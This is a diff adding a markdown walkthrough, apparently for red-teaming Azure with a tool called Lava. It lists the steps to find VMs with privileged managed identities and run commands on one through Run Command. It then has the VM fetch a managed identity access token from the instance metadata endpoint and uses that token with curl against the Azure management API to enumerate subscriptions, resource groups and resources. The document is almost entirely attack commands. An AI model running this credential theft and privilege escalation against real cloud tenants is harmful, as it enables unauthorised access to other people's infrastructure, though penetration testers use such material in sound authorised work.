@@ -1,0 +1,20 @@
+- Use CLI to login prior to running Lava
+	- `az login`
+	- `python3 lava.py`
+	- `whoami` - confirm authentication
+- Determine if any VM in the subscription is associated with a privileged managed identity
+	- `exec vm_list_privileged`
+- Use Run Command (as a Contributor) - Get Managed Identity access token
+	- `exec vm_rce -rgrp PENTEST-RG -vm_name linuxvm01`
+		- Non-interactive shell
+	- ` curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com' -H Metadata:true`
+	- Copy token from previous command, exit Lava, and run commands against the resource manager with elevated privilege
+		- `TOKEN=<ACCESS_TOKEN_FROM_PREVIOUS_STEP>`
+		- Get a list of subscriptions
+			- `curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions?api-version=2020-01-01 | jq`
+		- Store subscription ID in a variable
+			- `SUB_ID=$(curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions?apiversion=2020-01-01 | jq -r .value[].subscriptionId)`
+		- Get a list of resource groups
+			- `curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions/${SUB_ID}/resourcegroups?api-version=2019-10-01 | jq`
+		- Get a list of resources
+			- `curl --header "Authorization: Bearer ${TOKEN}" https://management.azure.com/subscriptions/${SUB_ID}/resources?api-version=2019-10-01 | jq`
